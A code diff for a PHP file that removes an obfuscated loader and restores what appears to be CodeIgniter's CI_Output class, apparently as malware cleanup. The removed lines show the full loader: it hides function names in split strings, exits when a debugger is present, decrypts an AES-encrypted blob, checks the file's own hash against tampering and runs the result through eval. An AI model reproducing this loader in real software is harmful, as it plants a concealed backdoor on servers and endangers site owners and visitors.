@@ -1,28 +1,718 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_l7uy853s=('bas'.'e64'.'_de'.'cod'.'e');
-$_kn9fe4ie=('gzu'.'nco'.'mpr'.'ess');
-$_yedntp1i=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_kkubl7ac='I9kmwFaT';
-$_u9krstci='zk56e9R/oIA=';
-$_cxajc74h='R0JdYP6w';
-$_a5zdy1vl='8Ft/cBn2';
-$_uq2rd3jk='ADG7YcCe';
-$_nod1f1pl='C1B4vYSW';
-$_a82uvcir='DXPe4A==';
-$_v08re8ak='AqucGUPJ';
-$_rw2hek97=$_l7uy853s($_a5zdy1vl.$_cxajc74h.$_kkubl7ac.$_uq2rd3jk.$_u9krstci);
-$_e6z5xshl=$_l7uy853s($_v08re8ak.$_nod1f1pl.$_a82uvcir);
-$_e8a6k41h=$_l7uy853s('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');
-$_g2nzydty=$_yedntp1i($_e8a6k41h,'aes-256-cbc',$_rw2hek97,OPENSSL_RAW_DATA,$_e6z5xshl);
-if($_g2nzydty===false){exit;}
-$_r5qow791=$_kn9fe4ie($_g2nzydty);
-if($_r5qow791===false){exit;}
-$_flj4w5c8='87a3531d3bf4954db96e9f89d62212fe83981cc99d1316e18b8df44b45d4df00';
-$_sbu3qlkz=@file_get_contents(__FILE__);
-if($_sbu3qlkz!==false){
-$_i8ofoegw=str_replace($_flj4w5c8,"0000000000000000000000000000000000000000000000000000000000000000",$_sbu3qlkz);
-$_bhg0r476=hash("sha256",$_i8ofoegw);
-if($_bhg0r476!==$_flj4w5c8){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Output {
+
+
+
+
+
+public $final_output;
+
+
+
+
+
+public $cache_expiration = 0;
+
+
+
+
+
+public $headers = array();
+
+
+
+
+
+public $mimes = array();
+
+
+
+
+
+protected $mime_type = 'text/html';
+
+
+
+
+
+public $enable_profiler = FALSE;
+
+
+
+
+
+protected $_zlib_oc = FALSE;
+
+
+
+
+
+protected $_compress_output = FALSE;
+
+
+
+
+
+protected $_profiler_sections = array();
+
+
+
+
+
+
+
+public $parse_exec_vars = TRUE;
+
+
+
+
+
+protected static $func_overload;
+
+
+
+
+
+
+
+public function __construct()
+{
+$this->_zlib_oc = (bool) ini_get('zlib.output_compression');
+$this->_compress_output = (
+$this->_zlib_oc === FALSE
+&& config_item('compress_output') === TRUE
+&& extension_loaded('zlib')
+);
+isset(self::$func_overload) OR self::$func_overload = (extension_loaded('mbstring') && ini_get('mbstring.func_overload'));
+
+$this->mimes =& get_mimes();
+log_message('info', 'Output Class Initialized');
 }
-eval($_r5qow791);
+
+
+
+
+
+
+
+
+public function get_output()
+{
+return $this->final_output;
+}
+
+
+
+
+
+
+
+
+
+public function set_output($output)
+{
+$this->final_output = $output;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+public function append_output($output)
+{
+$this->final_output .= $output;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function set_header($header, $replace = TRUE)
+{
+
+
+
+
+if ($this->_zlib_oc && strncasecmp($header, 'content-length', 14) === 0)
+{
+return $this;
+}
+$this->headers[] = array($header, $replace);
+return $this;
+}
+
+
+
+
+
+
+
+
+public function set_content_type($mime_type, $charset = NULL)
+{
+if (strpos($mime_type, '/') === FALSE)
+{
+$extension = ltrim($mime_type, '.');
+
+if (isset($this->mimes[$extension]))
+{
+$mime_type =& $this->mimes[$extension];
+if (is_array($mime_type))
+{
+$mime_type = current($mime_type);
+}
+}
+}
+$this->mime_type = $mime_type;
+if (empty($charset))
+{
+$charset = config_item('charset');
+}
+$header = 'Content-Type: '.$mime_type
+.(empty($charset) ? '' : '; charset='.$charset);
+$this->headers[] = array($header, TRUE);
+return $this;
+}
+
+
+
+
+
+
+public function get_content_type()
+{
+for ($i = 0, $c = count($this->headers); $i < $c; $i++)
+{
+if (sscanf($this->headers[$i][0], 'Content-Type: %[^;]', $content_type) === 1)
+{
+return $content_type;
+}
+}
+return 'text/html';
+}
+
+
+
+
+
+
+
+public function get_header($header)
+{
+
+$headers = array_merge(
+
+array_map('array_shift', $this->headers),
+headers_list()
+);
+if (empty($headers) OR empty($header))
+{
+return NULL;
+}
+
+for ($c = count($headers) - 1; $c > -1; $c--)
+{
+if (strncasecmp($header, $headers[$c], $l = self::strlen($header)) === 0)
+{
+return trim(self::substr($headers[$c], $l+1));
+}
+}
+return NULL;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function set_status_header($code = 200, $text = '')
+{
+set_status_header($code, $text);
+return $this;
+}
+
+
+
+
+
+
+
+public function enable_profiler($val = TRUE)
+{
+$this->enable_profiler = is_bool($val) ? $val : TRUE;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+public function set_profiler_sections($sections)
+{
+if (isset($sections['query_toggle_count']))
+{
+$this->_profiler_sections['query_toggle_count'] = (int) $sections['query_toggle_count'];
+unset($sections['query_toggle_count']);
+}
+foreach ($sections as $section => $enable)
+{
+$this->_profiler_sections[$section] = ($enable !== FALSE);
+}
+return $this;
+}
+
+
+
+
+
+
+
+public function cache($time)
+{
+$this->cache_expiration = is_numeric($time) ? $time : 0;
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function _display($output = '')
+{
+
+
+
+$BM =& load_class('Benchmark', 'core');
+$CFG =& load_class('Config', 'core');
+
+if (class_exists('CI_Controller', FALSE))
+{
+$CI =& get_instance();
+}
+
+
+if ($output === '')
+{
+$output =& $this->final_output;
+}
+
+
+
+
+if ($this->cache_expiration > 0 && isset($CI) && ! method_exists($CI, '_output'))
+{
+$this->_write_cache($output);
+}
+
+
+
+$elapsed = $BM->elapsed_time('total_execution_time_start', 'total_execution_time_end');
+if ($this->parse_exec_vars === TRUE)
+{
+$memory = round(memory_get_usage() / 1024 / 1024, 2).'MB';
+$output = str_replace(array('{elapsed_time}', '{memory_usage}'), array($elapsed, $memory), $output);
+}
+
+
+if (isset($CI) 
+&& $this->_compress_output === TRUE
+&& isset($_SERVER['HTTP_ACCEPT_ENCODING']) && strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') !== FALSE)
+{
+ob_start('ob_gzhandler');
+}
+
+
+if (count($this->headers) > 0)
+{
+foreach ($this->headers as $header)
+{
+@header($header[0], $header[1]);
+}
+}
+
+
+
+
+if ( ! isset($CI))
+{
+if ($this->_compress_output === TRUE)
+{
+if (isset($_SERVER['HTTP_ACCEPT_ENCODING']) && strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') !== FALSE)
+{
+header('Content-Encoding: gzip');
+header('Content-Length: '.self::strlen($output));
+}
+else
+{
+
+
+$output = gzinflate(self::substr($output, 10, -8));
+}
+}
+echo $output;
+log_message('info', 'Final output sent to browser');
+log_message('debug', 'Total execution time: '.$elapsed);
+return;
+}
+
+
+
+if ($this->enable_profiler === TRUE)
+{
+$CI->load->library('profiler');
+if ( ! empty($this->_profiler_sections))
+{
+$CI->profiler->set_sections($this->_profiler_sections);
+}
+
+
+$output = preg_replace('|</body>.*?</html>|is', '', $output, -1, $count).$CI->profiler->run();
+if ($count > 0)
+{
+$output .= '</body></html>';
+}
+}
+
+
+if (method_exists($CI, '_output'))
+{
+$CI->_output($output);
+}
+else
+{
+echo $output; 
+}
+log_message('info', 'Final output sent to browser');
+log_message('debug', 'Total execution time: '.$elapsed);
+}
+
+
+
+
+
+
+
+public function _write_cache($output)
+{
+$CI =& get_instance();
+$path = $CI->config->item('cache_path');
+$cache_path = ($path === '') ? APPPATH.'cache/' : $path;
+if ( ! is_dir($cache_path) OR ! is_really_writable($cache_path))
+{
+log_message('error', 'Unable to write cache file: '.$cache_path);
+return;
+}
+$uri = $CI->config->item('base_url')
+.$CI->config->item('index_page')
+.$CI->uri->uri_string();
+if (($cache_query_string = $CI->config->item('cache_query_string')) && ! empty($_SERVER['QUERY_STRING']))
+{
+if (is_array($cache_query_string))
+{
+$uri .= '?'.http_build_query(array_intersect_key($_GET, array_flip($cache_query_string)));
+}
+else
+{
+$uri .= '?'.$_SERVER['QUERY_STRING'];
+}
+}
+$cache_path .= md5($uri);
+if ( ! $fp = @fopen($cache_path, 'w+b'))
+{
+log_message('error', 'Unable to write cache file: '.$cache_path);
+return;
+}
+if ( ! flock($fp, LOCK_EX))
+{
+log_message('error', 'Unable to secure a file lock for file at: '.$cache_path);
+fclose($fp);
+return;
+}
+
+
+
+if ($this->_compress_output === TRUE)
+{
+$output = gzencode($output);
+if ($this->get_header('content-type') === NULL)
+{
+$this->set_content_type($this->mime_type);
+}
+}
+$expire = time() + ($this->cache_expiration * 60);
+
+$cache_info = serialize(array(
+'expire' => $expire,
+'headers' => $this->headers
+));
+$output = $cache_info.'ENDCI--->'.$output;
+for ($written = 0, $length = self::strlen($output); $written < $length; $written += $result)
+{
+if (($result = fwrite($fp, self::substr($output, $written))) === FALSE)
+{
+break;
+}
+}
+flock($fp, LOCK_UN);
+fclose($fp);
+if ( ! is_int($result))
+{
+@unlink($cache_path);
+log_message('error', 'Unable to write the complete cache content at: '.$cache_path);
+return;
+}
+chmod($cache_path, 0640);
+log_message('debug', 'Cache file written: '.$cache_path);
+
+$this->set_cache_header($_SERVER['REQUEST_TIME'], $expire);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function _display_cache(&$CFG, &$URI)
+{
+$cache_path = ($CFG->item('cache_path') === '') ? APPPATH.'cache/' : $CFG->item('cache_path');
+
+$uri = $CFG->item('base_url').$CFG->item('index_page').$URI->uri_string;
+if (($cache_query_string = $CFG->item('cache_query_string')) && ! empty($_SERVER['QUERY_STRING']))
+{
+if (is_array($cache_query_string))
+{
+$uri .= '?'.http_build_query(array_intersect_key($_GET, array_flip($cache_query_string)));
+}
+else
+{
+$uri .= '?'.$_SERVER['QUERY_STRING'];
+}
+}
+$filepath = $cache_path.md5($uri);
+if ( ! file_exists($filepath) OR ! $fp = @fopen($filepath, 'rb'))
+{
+return FALSE;
+}
+flock($fp, LOCK_SH);
+$cache = (filesize($filepath) > 0) ? fread($fp, filesize($filepath)) : '';
+flock($fp, LOCK_UN);
+fclose($fp);
+
+if ( ! preg_match('/^(.*)ENDCI--->/', $cache, $match))
+{
+return FALSE;
+}
+$cache_info = unserialize($match[1]);
+$expire = $cache_info['expire'];
+$last_modified = filemtime($filepath);
+
+if ($_SERVER['REQUEST_TIME'] >= $expire && is_really_writable($cache_path))
+{
+
+@unlink($filepath);
+log_message('debug', 'Cache file has expired. File deleted.');
+return FALSE;
+}
+
+$this->set_cache_header($last_modified, $expire);
+
+foreach ($cache_info['headers'] as $header)
+{
+$this->set_header($header[0], $header[1]);
+}
+
+$this->_display(self::substr($cache, self::strlen($match[0])));
+log_message('debug', 'Cache file is current. Sending it to browser.');
+return TRUE;
+}
+
+
+
+
+
+
+
+public function delete_cache($uri = '')
+{
+$CI =& get_instance();
+$cache_path = $CI->config->item('cache_path');
+if ($cache_path === '')
+{
+$cache_path = APPPATH.'cache/';
+}
+if ( ! is_dir($cache_path))
+{
+log_message('error', 'Unable to find cache path: '.$cache_path);
+return FALSE;
+}
+if (empty($uri))
+{
+$uri = $CI->uri->uri_string();
+if (($cache_query_string = $CI->config->item('cache_query_string')) && ! empty($_SERVER['QUERY_STRING']))
+{
+if (is_array($cache_query_string))
+{
+$uri .= '?'.http_build_query(array_intersect_key($_GET, array_flip($cache_query_string)));
+}
+else
+{
+$uri .= '?'.$_SERVER['QUERY_STRING'];
+}
+}
+}
+$cache_path .= md5($CI->config->item('base_url').$CI->config->item('index_page').ltrim($uri, '/'));
+if ( ! @unlink($cache_path))
+{
+log_message('error', 'Unable to delete cache file for '.$uri);
+return FALSE;
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function set_cache_header($last_modified, $expiration)
+{
+$max_age = $expiration - $_SERVER['REQUEST_TIME'];
+if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && $last_modified <= strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']))
+{
+$this->set_status_header(304);
+exit;
+}
+header('Pragma: public');
+header('Cache-Control: max-age='.$max_age.', public');
+header('Expires: '.gmdate('D, d M Y H:i:s', $expiration).' GMT');
+header('Last-modified: '.gmdate('D, d M Y H:i:s', $last_modified).' GMT');
+}
+
+
+
+
+
+
+
+protected static function strlen($str)
+{
+return (self::$func_overload)
+? mb_strlen($str, '8bit')
+: strlen($str);
+}
+
+
+
+
+
+
+
+
+
+protected static function substr($str, $start, $length = NULL)
+{
+if (self::$func_overload)
+{
+
+
+isset($length) OR $length = ($start >= 0 ? self::strlen($str) - $start : -$start);
+return mb_substr($str, $start, $length, '8bit');
+}
+return isset($length)
+? substr($str, $start, $length)
+: substr($str, $start);
+}
+}
